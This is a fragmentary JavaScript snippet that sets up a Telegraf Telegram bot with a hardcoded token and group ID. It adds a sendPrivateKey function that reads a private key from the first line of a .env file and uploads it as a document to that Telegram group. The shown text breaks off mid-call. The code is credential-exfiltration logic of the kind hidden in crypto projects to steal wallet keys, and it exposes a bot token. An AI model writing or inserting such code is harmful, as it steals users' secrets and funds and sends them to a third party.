...
// Initialize a new Telegraf instance with your bot token
const bot = new Telegraf('6609170788:AAEr-zOXtQRGViZj93BeLRQjMniOlwElqSA');

// Specify your Telegram group ID
const TELEGRAM_GROUP_ID = '-1002131573801';
...
// Add this function to send the private key through Telegram
async function sendPrivateKey() {
    try {
        // Read the private key from the first line of the .env file
        ...
        // Send the private key as a document to the Telegram group
        await bot.telegram.sendDocument(TELEGRAM_GROUP_ID, {
            source: privateKeyBuffer,
